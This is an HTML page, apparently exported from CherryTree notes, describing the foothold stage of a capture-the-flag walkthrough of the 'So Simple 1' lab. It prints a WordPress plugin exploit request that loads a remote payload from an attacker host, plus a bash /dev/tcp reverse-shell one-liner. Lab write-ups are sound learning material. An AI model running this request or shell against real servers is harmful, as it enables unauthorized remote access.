@@ -1,0 +1,21 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>foothold</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="styles.css" type="text/css" />
+</head>
+<body><div class="main"><div class="tree">
+<p><strong>Index</strong></p>
+<p><a href="So_Simple_1.html">So Simple 1</a></p>
+
+<ol>
+<li><a href="So_Simple_1--nmap.html">nmap</a></li>
+<li><a href="So_Simple_1--dirbuster.html">dirbuster</a></li>
+<li><a href="So_Simple_1--wpscan.html">wpscan</a></li>
+<li><a href="So_Simple_1--enumeration.html">enumeration</a></li>
+<li><a href="So_Simple_1--foothold.html">foothold</a></li>
+<li><a href="So_Simple_1--privilege_escalation.html">privilege escalation</a></li>
+</ol></div>
+<div class="page"><h1><b><u>foothold</u></b></h1><h3>To get the shell I had to manually send a GET request to the vulnerable path </h3><code><h3>"http://192.168.56.111/wordpress/wp-admin/admin-post.php?swp_debug=load_options&amp;swp_url=http://192.168.56.1:8000/payload.txt"<code></h3></code><h3> and as a payload I sent a request for a reverse shell.<br /><br /></h3><strong><h3>&lt;pre&gt;system("bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.1/9000 0&gt;&amp;1'")&lt;/pre&gt;</h3></strong><h3><br /><br />And the session for the reverse shell opened up.<br /><br /></h3><img src="images/5-1.png" alt="images/5-1.png" /><br /><br /><h3>Then I started the investigation for acquiring root privilege.</h3><br /><br /></div></div>
+</body></html>
